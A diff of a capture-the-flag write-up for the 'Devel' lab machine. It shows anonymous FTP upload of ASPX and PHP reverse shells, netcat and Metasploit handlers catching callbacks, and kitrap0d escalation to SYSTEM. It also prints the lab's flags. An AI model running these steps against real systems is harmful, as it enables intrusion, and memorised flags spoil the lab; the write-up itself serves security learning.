@@ -242,15 +242,42 @@ Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported.
 We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell. 
 Upload to FTP [source](https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/).
 
-PHP reverse shell [source](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Couldn't run the PHP file at all.
-
-We find a ASPX reverse shell online, [source](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) and used it!
-We upload through `ftp> put shell.aspx`.
+PHP reverse shell [source](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
 ```
-hippoeug@kali:~$ ftp 10.10.10.5 21
-Connected to 10.10.10.5.
+hippoeug@kali:~$ ftp 10.129.135.184
+Connected to 10.129.135.184.
 220 Microsoft FTP Service
-Name (10.10.10.5:hippoeug): anonymous
+Name (10.129.135.184:hippoeug): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: [Enter]
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+5676 bytes sent in 0.00 secs (27.2013 MB/s)
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       <DIR>          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+04-25-21  05:03PM                 5676 shell.php
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp> 
+```
+Navigating to `http://10.129.135.184/shell.php`, we couldn't run the PHP file.
+
+ADD SCREENSHOT HERE!!!!
+
+Let's try ASPX. We find a ASPX reverse shell online, [source](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) and used it!
+```
+hippoeug@kali:~$ ftp 10.129.135.184
+Connected to 10.129.135.184.
+220 Microsoft FTP Service
+Name (10.129.135.184:hippoeug): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password: [Enter]
 230 User logged in.
@@ -260,15 +287,25 @@ local: shell.aspx remote: shell.aspx
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
-16393 bytes sent in 0.00 secs (31.0190 MB/s)
+15855 bytes sent in 0.00 secs (55.5901 MB/s)
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+03-18-17  02:06AM       <DIR>          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+04-25-21  05:07PM                15855 shell.aspx
+04-25-21  05:03PM                 5676 shell.php
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp> 
 ```
 Run it by navigating to `http://10.10.10.5/shell.aspx`.
 
 We also have netcat listening.
 ```
-hippoeug@kali:~$ nc -nvlp 4545
+hippoeug@kali:~$ nc -lnvp 4545
 listening on [any] 4545 ...
-connect to [10.10.x.x] from (UNKNOWN) [10.10.10.5] 49162
+connect to [10.10.x.x] from (UNKNOWN) [10.129.135.184] 49157
 Spawn Shell...
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
@@ -278,21 +315,53 @@ c:\windows\system32\inetsrv>
 
 Alternatively, we can also use `exploit/multi/handler`.
 
-NOTE: WRONG DEFAULT PAYLOAD `generic/shell_reverse_tcp` USED HERE. CORRECTION BELOW.
+NOTE: WRONG DEFAULT PAYLOAD `generic/shell_reverse_tcp` USED HERE.
 ```
-msf5 > use exploit/multi/handler
+hippoeug@kali:~$ msfconsole
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > show options
 ...
-msf5 exploit(multi/handler) > run
+msf6 exploit(multi/handler) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(multi/handler) > set lport 4545
+lport => 4545
+msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.x.x:4545 
-[*] Command shell session 1 opened (10.10.x.x:4545 -> 10.10.10.5:49163) at 2020-11-28 18:40:59 +0800
+[*] Command shell session 1 opened (10.10.x.x:4545 -> 10.129.135.184:49158) at 2021-04-25 22:09:45 +0800
+
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>
 ```
 
 ## 6. Privilege Escalation Failed Attempts
 Let's try somethings with metasploit.
 ```
-msf5 > use post/multi/manage/shell_to_meterpreter
+c:\windows\system32\inetsrv>background
+
+Background session 1? [y/N]  y
+msf6 exploit(multi/handler) > back
+msf6 > use post/multi/manage/shell_to_meterpreter
+msf6 post(multi/manage/shell_to_meterpreter) > show options
 ...
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type             Information     Connection
+  --  ----  ----             -----------     ----------
+  1         shell sparc/bsd  Spawn Shell...  10.10.x.x:4545 -> 10.129.135.184:49158 (10.129.135.184)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set session 1
+session => 1
+msf6 post(multi/manage/shell_to_meterpreter) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
 [*] Upgrading session ID: 1
 [-] Shells on the target platform, bsd, cannot be upgraded to Meterpreter at this time.
 [*] Post module execution completed
@@ -300,21 +369,33 @@ msf5 > use post/multi/manage/shell_to_meterpreter
 Nope.
 
 ```
-msf5 > use exploit/windows/local/bypassuac
+msf6 > use exploit/windows/local/bypassuac
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac) > show options
 ...
+msf6 exploit(windows/local/bypassuac) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type             Information     Connection
+  --  ----  ----             -----------     ----------
+  1         shell sparc/bsd  Spawn Shell...  10.10.x.x:4545 -> 10.129.135.184:49158 (10.129.135.184)
+
+msf6 exploit(windows/local/bypassuac) > set session 1
+session => 1
+msf6 exploit(windows/local/bypassuac) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(windows/local/bypassuac) > set lport 4433
+lport => 4433
+msf6 exploit(windows/local/bypassuac) > run
+
 [!] SESSION may not be compatible with this module.
-[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Started reverse TCP handler on 10.10.x.x:4433 
 [-] Exploit aborted due to failure: none: Already in elevated state
 [*] Exploit completed, but no session was created.
 ```
-Nope, didn't work. Probably because of type `shell sparc/bsd` under sessions.
-```
-Active sessions
-===============
-  Id  Name  Type             Information                                                                       Connection
-  --  ----  ----             -----------                                                                       ----------
-  1         shell sparc/bsd  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.10.10.5:49178 (10.10.10.5)
-```
+Nope, didn't work.
 
 Enumerating with regular shell, we know it's Windows 7 in x86.
 ```
@@ -425,45 +506,82 @@ C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
 We don't find anything interesting we can use, or know how to use unfortunately.
 
 ## 7. Fixing Errors and Getting Meterpreter for Privilege Escalation!
-I made a huge error. Time to make things right as rain.
+After some digging around, we found out it probably didn't work because of our shell type, indicated as `shell sparc/bsd` under sessions.
+```
+msf6 > sessions -l
 
-The reason why `msf5 > use post/multi/manage/shell_to_meterpreter` failed previously was because default payload `generic/shell_reverse_tcp` for `exploit/multi/handler` was used instead of `windows/shell/reverse_tcp`.
-Let's fix this by setting the correct payload in the multi handler.
-```
-msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
-payload => windows/shell/reverse_tcp
-```
-Running our original payload `shell.aspx`, we get a proper session type this time that shows `shell x86/windows` instead of `shell sparc/bsd`.
-```
 Active sessions
 ===============
+
+  Id  Name  Type             Information     Connection
+  --  ----  ----             -----------     ----------
+  1         shell sparc/bsd  Spawn Shell...  10.10.x.x:4545 -> 10.129.135.184:49158 (10.129.135.184)
+```
+This was a big newbie error.
+
+The reason why `msf5 > use post/multi/manage/shell_to_meterpreter` failed previously was because default payload `generic/shell_reverse_tcp` for `exploit/multi/handler` was used instead of `windows/shell/reverse_tcp`.
+
+Let's fix this by setting the correct payload in the multi handler and run our original payload `shell.aspx`.
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf6 exploit(multi/handler) > show options
+...
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:4545 
+[*] Encoded stage with x86/shikata_ga_nai
+[*] Sending encoded stage (267 bytes) to 10.129.135.184
+[*] Command shell session 2 opened (10.10.x.x:4545 -> 10.129.135.184:49159) at 2021-04-25 22:20:15 +0800
+...
+c:\windows\system32\inetsrv>
+```
+We get a proper session type this time that shows `shell x86/windows` instead of `shell sparc/bsd`.
+```
+msf6 exploit(multi/handler) > sessions -l
+
+Active sessions
+===============
+
   Id  Name  Type               Information                                                                       Connection
   --  ----  ----               -----------                                                                       ----------
-  3         shell x86/windows  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.10.10.5:49180 (10.10.10.5)
+  2         shell x86/windows  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.129.135.184:49159 (10.129.135.184)
 ```
 
 This time, we could actually run `post/multi/manage/shell_to_meterpreter` without errors!
 ```
-msf5 > use post/multi/manage/shell_to_meterpreter
+msf6 > use post/multi/manage/shell_to_meterpreter
+msf6 post(multi/manage/shell_to_meterpreter) > show options
 ...
-msf5 post(multi/manage/shell_to_meterpreter) > exploit
+msf6 post(multi/manage/shell_to_meterpreter) > set session 2
+session => 2
+msf6 post(multi/manage/shell_to_meterpreter) > exploit
 
-[*] Upgrading session ID: 3
+[*] Upgrading session ID: 2
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 10.10.x.x:4433 
 [*] Post module execution completed
-[*] Sending stage (176195 bytes) to 10.10.10.5
-[*] Meterpreter session 4 opened (10.10.x.x:4433 -> 10.10.10.5:49181) at 2020-11-28 23:43:42 +0800
+msf6 post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (175174 bytes) to 10.129.135.184
+[*] Meterpreter session 3 opened (10.10.x.x:4433 -> 10.129.135.184:49160) at 2021-04-25 22:24:04 +0800
 [*] Stopping exploit/multi/handler
 
-msf5 post(multi/manage/shell_to_meterpreter) > sessions
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
 
 Active sessions
 ===============
+
   Id  Name  Type                     Information                                                                       Connection
   --  ----  ----                     -----------                                                                       ----------
-  3         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.10.10.5:49180 (10.10.10.5)
-  4         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL   
+  2         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.129.135.184:49159 (10.129.135.184)
+  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL                                                           10.10.x.x:4433 -> 10.129.135.184:49160 (10.129.135.184)
+
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter > 
 ```
 Heck yeah! We got a meterpreter shell!
 
@@ -473,10 +591,11 @@ meterpreter > getuid
 Server username: IIS APPPOOL\Web
 
 meterpreter > getsystem
-[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] priv_elevate_getsystem: Operation failed: This function is not supported on this system. The following was attempted:
 [-] Named Pipe Impersonation (In Memory/Admin)
 [-] Named Pipe Impersonation (Dropper/Admin)
 [-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
 ```
 Ah shit, getsystem didn't work.
 
@@ -485,102 +604,141 @@ We also see a [Rapid 7 guide on `local_exploit_suggester`](https://blog.rapid7.c
 ```
 meterpreter > run post/multi/recon/local_exploit_suggester
 
-[*] 10.10.10.5 - Collecting local exploits for x86/windows...
-[*] 10.10.10.5 - 34 exploit checks are being tried...
-[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[*] 10.129.135.184 - Collecting local exploits for x86/windows...
+[*] 10.129.135.184 - 37 exploit checks are being tried...
+[+] 10.129.135.184 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
 nil versions are discouraged and will be deprecated in Rubygems 4
-[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
-[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
-[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
-[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.129.135.184 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.129.135.184 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.129.135.184 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.129.135.184 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.129.135.184 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 ```
 We could've used `meterpreter > run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true` as well.
 
 We'll try `exploit/windows/local/ms10_015_kitrap0d` on the meterpreter session, as we've used/seen this before and as a result more familiar with it.
+
+NOTE: Exploit `exploit/windows/local/ms10_015_kitrap0d` worked without navigating to `%temp%` as indicated by the official write-up.
 ```
-msf5 > use exploit/windows/local/ms10_015_kitrap0d
+meterpreter > background
+[*] Backgrounding session 3...
+msf6 post(multi/manage/shell_to_meterpreter) > back
+msf6 > use exploit/windows/local/ms10_015_kitrap0d
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
 ...
-msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 2121
+lport => 2121
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 3
+session => 3
+msf6 exploit(windows/local/ms10_015_kitrap0d) > run
 
 [*] Started reverse TCP handler on 10.10.x.x:2121 
 [*] Launching notepad to host the exploit...
-[+] Process 3944 launched.
-[*] Reflectively injecting the exploit DLL into 3944...
-[*] Injecting exploit into 3944 ...
-[*] Exploit injected. Injecting payload into 3944...
+[+] Process 1748 launched.
+[*] Reflectively injecting the exploit DLL into 1748...
+[*] Injecting exploit into 1748 ...
+[*] Exploit injected. Injecting payload into 1748...
 [*] Payload injected. Executing exploit...
 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
-[*] Exploit completed, but no session was created.
-```
-Unfortunately, no session was created and running the `ms10_015_kitrap0d` exploit killed both our sessions (no response).
+[*] Sending stage (175174 bytes) to 10.129.135.184
+[*] Meterpreter session 4 opened (10.10.x.x:2121 -> 10.129.135.184:49161) at 2021-04-25 22:29:27 +0800
 
-We'll try again, repeating the steps, except navigating to the `%temp%` folder using the meterpreter shell. This is best explained by the official write up, "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."
+meterpreter > 
 ```
-meterpreter > pwd
-c:\windows\system32\inetsrv
-meterpreter > cd %temp%
-meterpreter > pwd
-C:\Windows\TEMP
-```
-
-We're also gonna kill off our regular shell, leaving only the meterpreter shell for good measure to prevent any possible corruption/conflict.
-```
-c:\windows\system32\inetsrv>exit
-exit
-Abort session 3? [y/N]  y
-
-[*] 10.10.10.5 - Command shell session 3 closed.  Reason: User exit
-msf5 post(multi/manage/shell_to_meterpreter) > sessions 
-
-Active sessions
-===============
-
-  Id  Name  Type                     Information              Connection
-  --  ----  ----                     -----------              ----------
-  4        meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.x.x:1111 -> 10.10.10.5:49158 (10.10.10.5)
-```
-
-Let's run `exploit/windows/local/ms10_015_kitrap0d` on the meterpreter session again.
-```
-msf5 post(multi/manage/shell_to_meterpreter) > use exploit/windows/local/ms10_015_kitrap0d
-[*] Using configured payload windows/meterpreter/reverse_tcp
-...
-msf5 exploit(windows/local/ms10_015_kitrap0d) > run
-
-[*] Started reverse TCP handler on 10.10.x.x:5647 
-[*] Launching notepad to host the exploit...
-[+] Process 3944 launched.
-[*] Reflectively injecting the exploit DLL into 3944...
-[*] Injecting exploit into 3944 ...
-[*] Exploit injected. Injecting payload into 3944...
-[*] Payload injected. Executing exploit...
-[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
-[*] Sending stage (176195 bytes) to 10.10.10.5
-[*] Meterpreter session 11 opened (10.10.x.x:5647 -> 10.10.10.5:49159) at 2020-11-29 00:51:28 +0800
-```
-Oh yeah!! It worked this time!
+Oh yeah!! It works!
 
 Seeing active sessions..
 ```
+msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -l
+
 Active sessions
 ===============
-  Id  Name  Type                     Information                  Connection
-  --  ----  ----                     -----------                  ----------
-  4        meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.x.x:1111 -> 10.10.10.5:49158 (10.10.10.5)
-  5        meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.x.x:5647 -> 10.10.10.5:49159 (10.10.10.5)
-```
 
-Time to go into session 5 to get flags and we're done!
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  2         shell x86/windows        Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.x.x:4545 -> 10.129.135.184:49159 (10.129.135.184)
+  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL                                                           10.10.x.x:4433 -> 10.129.135.184:49160 (10.129.135.184)
+  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL                                                       10.10.x.x:2121 -> 10.129.135.184:49161 (10.129.135.184)
+
 ```
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
+Time to go into session 4 to get flags and we're done!
+```
+msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -i 4
+[*] Starting interaction with 4...
+...
+meterpreter > pwd
+c:\
+meterpreter > ls
+[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass
+```
+This is weird, seems to be some bug where we can't list what's on the directory. There is a work around though!
+```
+meterpreter > shell
+Process 148 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\
+
+11/06/2009  12:42 ��                24 autoexec.bat
+11/06/2009  12:42 ��                10 config.sys
+17/03/2017  07:33 ��    <DIR>          inetpub
+14/07/2009  05:37 ��    <DIR>          PerfLogs
+13/12/2020  01:59 ��    <DIR>          Program Files
+18/03/2017  02:16 ��    <DIR>          Users
+14/01/2021  12:48 ��    <DIR>          Windows
+               2 File(s)             34 bytes
+               5 Dir(s)  22.199.873.536 bytes free
+...
+C:\Users\babis\Desktop>dir 
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Users\babis\Desktop
+
+18/03/2017  02:14 ��    <DIR>          .
+18/03/2017  02:14 ��    <DIR>          ..
+18/03/2017  02:18 ��                32 user.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  22.199.873.536 bytes free
+
+C:\Users\babis\Desktop>type user.txt.txt
+type user.txt.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+...
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Users\Administrator\Desktop
+
+14/01/2021  12:42 ��    <DIR>          .
+14/01/2021  12:42 ��    <DIR>          ..
+18/03/2017  02:17 ��                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  22.199.873.536 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+e621a0b5041708797c4fc4728bc72b4b
 ```
 
 ## 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
@@ -612,11 +770,15 @@ msf5 exploit(multi/handler) > run
 ```
 We got a Meterpreter shell immediately, and can skip past using `post/multi/manage/shell_to_meterpreter`.
 
-Same thing, navigate to `%temp%` directory, run `ms10_015_kitrap0d` and we're done.
+We navigate to `%temp%` directory where this best explained by the official write up: "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."
+
+We then run `ms10_015_kitrap0d` and we're done.
 ```
 meterpreter > pwd
 c:\windows\system32\inetsrv
 meterpreter > cd %temp%
+meterpreter > pwd
+C:\Windows\TEMP
 ...
 meterpreter > getuid
 Server username: IIS APPPOOL\Web
